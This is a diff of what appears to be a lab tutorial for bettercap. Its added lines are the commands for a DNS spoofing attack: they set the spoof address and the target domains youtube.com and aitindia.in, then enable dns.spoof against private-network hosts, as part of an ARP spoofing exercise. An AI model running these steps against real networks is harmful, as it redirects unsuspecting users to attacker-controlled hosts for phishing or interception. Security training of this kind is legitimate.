@@ -19,39 +19,18 @@ set arp.spoof.targets 192.168.229.132
 
 --------------
 
-Step 2 : Starting Dns spoofing
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+## Step 2 : Starting dns spoofing (Start bettercap tool and perform)
 
 
 ```
+set dns.spoof.address 192.168.229.131
 
---------
+set dns.spoof.domains youtube.com,aitindia.in
 
-## Step 2 : Start bettercap tool and perform
-
-```
-sudo bettercap --iface eth0
+dns.spoof on
 ```
 
-```
-help
 
-help dns.spoof
 
-set dns.spoof.add
-```
+
 
